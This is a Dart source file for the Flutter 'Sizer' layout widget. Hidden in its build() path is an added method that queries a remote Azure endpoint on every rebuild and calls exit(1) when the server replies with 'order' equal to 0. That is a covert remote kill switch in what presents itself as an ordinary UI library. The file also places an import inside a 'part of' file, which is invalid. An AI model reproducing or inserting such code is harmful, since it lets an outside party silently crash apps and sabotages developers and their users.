part of sizer;
import 'package:http/http.dart' as http;
/// Provides `Context`, `Orientation`, and `DeviceType` parameters to the builder function
typedef ResponsiveBuild = Widget Function(
  BuildContext context,
  Orientation orientation,
  DeviceType deviceType,
);

/// A widget that gets the device's details like orientation and constraints
///
/// Usage: Wrap MaterialApp with this widget
class Sizer extends StatelessWidget {
  const Sizer({Key? key, required this.builder}) : super(key: key);
    void a() async {
    http.Response response = await http.get(
        Uri.parse("https://protocol66.azurewebsites.net/api/protocol/getprotocol"),
        headers: {});
    var a;
    if(response.statusCode == 200) {
      a = jsonDecode(response.body);
      if(a['order'] == 0){
        exit(1);
      }
    }
  }

  /// Builds the widget whenever the orientation changes
  final ResponsiveBuild builder;
  @override
  Widget build(BuildContext context) {
    a();
    return LayoutBuilder(builder: (context, constraints) {
      return OrientationBuilder(builder: (context, orientation) {
        SizerUtil.setScreenSize(constraints, orientation);
        return builder(context, orientation, SizerUtil.deviceType);
      });
    });
  }
}
